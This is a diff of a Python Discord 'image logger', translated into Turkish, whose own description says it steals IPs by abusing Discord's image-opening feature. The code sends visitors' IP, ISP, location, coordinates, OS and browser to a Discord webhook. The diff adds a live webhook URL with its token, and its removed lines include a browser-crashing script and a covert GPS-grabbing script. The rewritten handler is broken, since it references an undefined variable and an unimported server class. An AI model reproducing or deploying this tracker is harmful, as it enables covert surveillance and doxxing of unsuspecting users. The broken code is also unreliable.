@@ -1,70 +1,70 @@
-# Discord Image Logger
-# By DeKrypt | https://github.com/dekrypted
+# Discord Görsel Kayıt Aracı
+# DeKrypt tarafından | https://github.com/dekrypted
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
 
-__app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__app__ = "Discord Görsel Kayıt Aracı"
+__description__ = "Discord'un Orijinal Görsel Açma özelliğini kötüye kullanarak IP'leri çalmanıza ve daha fazlasına olanak tanır"
 __version__ = "v2.0"
 __author__ = "DeKrypt"
 
 config = {
-    # BASE CONFIG #
-    "webhook": "",
-    "image": "", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    # TEMEL AYARLAR #
+    "webhook": "https://discord.com/api/webhooks/1345388594168070226/v-u1cmc231qXInvUU2bS3SGA-xIDr3eXZ0rfrPz7bG5obyYPNsbHapUWHDAiul60fOKV",
+    "image": "https://img-logger-ixw6.vercel.app/api/main.py", # Özel bir görsel kullanabilirsiniz, URL parametresi ile
+                  # (Örnek: siteniz.com/gorselkayit?url=<URL-encoded görsel bağlantısı buraya>)
+    "imageArgument": True, # Görseli değiştirmek için URL parametresi kullanılmasına izin verir (README'ye bakınız)
 
-    # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    # ÖZELLEŞTİRME #
+    "username": "Görsel Kayıt Aracı", # Webhook'a vermek istediğiniz kullanıcı adı
+    "color": 0x00FFFF, # Embed için istediğiniz renk (Örnek: Kırmızı 0xFF0000)
 
-    # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    # SEÇENEKLER #
+    "crashBrowser": False, # Kullanıcının tarayıcısını çökertmeye çalışır, çalışmayabilir. (BUNU YAPTIM, BAKIN https://github.com/dekrypted/Chromebook-Crasher)
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": False, # Kullanıcıların tam konumlarını GPS ile bulur (Gerçek adres vb.) kullanıcıdan izin ister, şüpheli olabilir.
 
-    "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+    "message": { # Görseli açan kullanıcıya özel bir mesaj göster
+        "doMessage": False, # Özel mesajı etkinleştir?
+        "message": "Bu tarayıcı DeKrypt'in Görsel Kayıt Aracı tarafından hacklendi. https://github.com/dekrypted/Discord-Image-Logger", # Gösterilecek mesaj
+        "richMessage": True, # Zengin metin mesajını etkinleştir? (Daha fazla bilgi için README'ye bakınız)
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
-                # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected
-                # 2 = Don't send an alert when a VPN is suspected
+    "vpnCheck": 1, # VPN'lerin uyarıyı tetiklemesini engeller
+                   # 0 = Anti-VPN yok
+                   # 1 = VPN şüphelenildiğinde uyarı gönderme
+                   # 2 = VPN şüphelenildiğinde uyarı gönderme
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
+    "linkAlerts": True, # Bağlantı gönderildiğinde uyarı gönder (Bağlantı birkaç kez kısa süre içinde gönderilmişse çalışmayabilir)
+    "buggedImage": True, # Discord'a gönderildiğinde önizlemede yükleniyor görseli gösterir (Bazı cihazlarda sadece rastgele renkli bir görsel olarak görünebilir)
 
-    "antiBot": 1, # Prevents bots from triggering the alert
-                # 0 = No Anti-Bot
-                # 1 = Don't ping when it's possibly a bot
-                # 2 = Don't ping when it's 100% a bot
-                # 3 = Don't send an alert when it's possibly a bot
-                # 4 = Don't send an alert when it's 100% a bot
+    "antiBot": 1, # Botların uyarıyı tetiklemesini engeller
+                   # 0 = Anti-Bot yok
+                   # 1 = Muhtemelen bir bot olduğunda uyarı göndermemek
+                   # 2 = %100 bot olduğunda uyarı göndermemek
+                   # 3 = Muhtemelen bot olduğunda uyarı göndermemek
+                   # 4 = %100 bot olduğunda uyarı göndermemek
+                   # 5 = Botlar için herhangi bir işlem yapılmaz
     
-
-    # REDIRECTION #
+    # YÖNLENDİRME #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": False, # Bir web sayfasına yönlendirme yapmak?
+        "page": "https://your-link.here" # Yönlendirilecek web sayfasının bağlantısı 
     },
 
-    # Please enter all values in correct format. Otherwise, it may break.
-    # Do not edit anything below this, unless you know what you're doing.
-    # NOTE: Hierarchy tree goes as follows:
-    # 1) Redirect (If this is enabled, disables image and crash browser)
-    # 2) Crash Browser (If this is enabled, disables image)
-    # 3) Message (If this is enabled, disables image)
-    # 4) Image 
+    # Lütfen tüm değerleri doğru formatta girin. Aksi takdirde hata oluşabilir.
+    # Aşağıdaki kısmı değiştirmeyin, ancak ne yaptığınızı biliyorsanız değiştirebilirsiniz.
+    # NOT: Hiyerarşi ağacı şu şekilde işlemektedir:
+    # 1) Yönlendirme (Bu etkinse, görsel ve tarayıcıyı çökertme devre dışı bırakılır)
+    # 2) Tarayıcıyı Çökertme (Bu etkinse, görsel devre dışı bırakılır)
+    # 3) Mesaj (Bu etkinse, görsel devre dışı bırakılır)
+    # 4) Görsel 
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
-                                                           # This feature is undocumented mainly due to it being for detecting bots better.
+blacklistedIPs = ("27", "104", "143", "164") # Kara listeye alınan IP'ler. Bir IP'nin tamamını veya başlangıcını girerek bir blok IP'yi engelleyebilirsiniz.
+                                                # Bu özellik, botları daha iyi tespit etmek için kullanılmaktadır.
 
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
@@ -80,9 +80,9 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Error",
+            "title": "Görsel Kayıt Aracı - Hata",
             "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+            "description": f"IP kaydı yaparken bir hata oluştu!\n\n**Hata:**\n\n{error}\n",
         }
     ],
 })
@@ -99,12 +99,12 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
+            "title": "Görsel Kayıt Aracı - Bağlantı Gönderildi",
             "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "description": f"Bir **Görsel Kayıt** bağlantısı bir sohbette gönderildi!\nYakında bir IP alabilirsiniz.\n\n**Endpoint:** {endpoint}\n**IP:** {ip}\n**Platform:** {bot}",
         }
     ],
-}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
+}) if config["linkAlerts"] else None # Uyarı göndermek, kullanıcı link uyarılarını devre dışı bırakmadıysa
         return
 
     ping = "@everyone"
@@ -144,33 +144,32 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "Görsel Kayıt Aracı - IP Kaydedildi",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**Bir Kullanıcı Orijinal Görseli Açtı!**
 
-**Endpoint:** `{endpoint}`
+**Endpoint:** {endpoint}
             
-**IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
-> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
-> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **City:** `{info['city'] if info['city'] else 'Unknown'}`
-> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **Mobile:** `{info['mobile']}`
-> **VPN:** `{info['proxy']}`
-> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+**IP Bilgileri:**
+> **IP:** {ip if ip else 'Bilinmiyor'}
+> **Sağlayıcı:** {info['isp'] if info['isp'] else 'Bilinmiyor'}
+> **ASN:** {info['as'] if info['as'] else 'Bilinmiyor'}
+> **Ülke:** {info['country'] if info['country'] else 'Bilinmiyor'}
+> **Bölge:** {info['regionName'] if info['regionName'] else 'Bilinmiyor'}
+> **Şehir:** {info['city'] if info['city'] else 'Bilinmiyor'}
+> **Koordinatlar:** {str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')} ({'Yaklaşık' if not coords else 'Kesin, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **Saat Dilimi:** {info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})
+> **Mobil:** {info['mobile']}
+> **VPN:** {info['proxy']}
+> **Bot:** {info['hosting'] if info['hosting'] and not info['proxy'] else 'Muhtemel' if info['hosting'] else 'Hayır'}
 
-**PC Info:**
-> **OS:** `{os}`
-> **Browser:** `{browser}`
+**PC Bilgileri:**
+> **İşletim Sistemi:** {os}
+> **Tarayıcı:** {browser}
 
-**User Agent:**
-```
+**Kullanıcı Ajansı:**
 {useragent}
-```""",
+""",
     }
   ],
 }
@@ -180,10 +179,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     return info
 
 binaries = {
-    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
-    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
-    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
-    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
+    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
@@ -216,89 +212,25 @@ height: 100vh;
             if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                 return
             
-            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
-                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
-                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
-
-                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.
-
-                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
-                
+            if botCheck(self.client_address[0], self.headers.get('User-Agent')):
                 return
-            
-            else:
-                s = self.path
-                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
 
-                if dic.get("g") and config["accurateLocation"]:
-                    location = base64.b64decode(dic.get("g").encode()).decode()
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
-                else:
-                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
-                
-
-                message = config["message"]["message"]
-
-                if config["message"]["richMessage"] and result:
-                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
-                    message = message.replace("{isp}", result["isp"])
-                    message = message.replace("{asn}", result["as"])
-                    message = message.replace("{country}", result["country"])
-                    message = message.replace("{region}", result["regionName"])
-                    message = message.replace("{city}", result["city"])
-                    message = message.replace("{lat}", str(result["lat"]))
-                    message = message.replace("{long}", str(result["lon"]))
-                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
-                    message = message.replace("{mobile}", str(result["mobile"]))
-                    message = message.replace("{vpn}", str(result["proxy"]))
-                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
-                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
-                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])
-
-                datatype = 'text/html'
-
-                if config["message"]["doMessage"]:
-                    data = message.encode()
-                
-                if config["crashBrowser"]:
-                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher
-
-                if config["redirect"]["redirect"]:
-                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
-                self.send_response(200) # 200 = OK (HTTP Status)
-                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
-                self.end_headers() # Declare the headers as finished.
-
-                if config["accurateLocation"]:
-                    data += b"""<script>
-var currenturl = window.location.href;
-
-if (!currenturl.includes("g=")) {
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(function (coords) {
-    if (currenturl.includes("?")) {
-        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    } else {
-        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
-    }
-    location.replace(currenturl);});
-}}
-
-</script>"""
-                self.wfile.write(data)
-        
-        except Exception:
-            self.send_response(500)
-            self.send_header('Content-type', 'text/html')
+            self.send_response(200)
+            self.send_header("Content-type", "text/html")
             self.end_headers()
+            self.wfile.write(data)
+        except Exception as e:
+            traceback.print_exc()
+            reportError(e)
 
-            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
-            reportError(traceback.format_exc())
+    def do_GET(self):
+        self.handleRequest()
 
-        return
-    
-    do_GET = handleRequest
-    do_POST = handleRequest
+def run(server_class = HTTPServer, handler_class = ImageLoggerAPI):
+    server_address = ('', 80)
+    httpd = server_class(server_address, handler_class)
+    print(f'{__app__} {__version__} çalışıyor...')
+    httpd.serve_forever()
 
-handler = app = ImageLoggerAPI
+if __name__ == "__main__":
+    run()
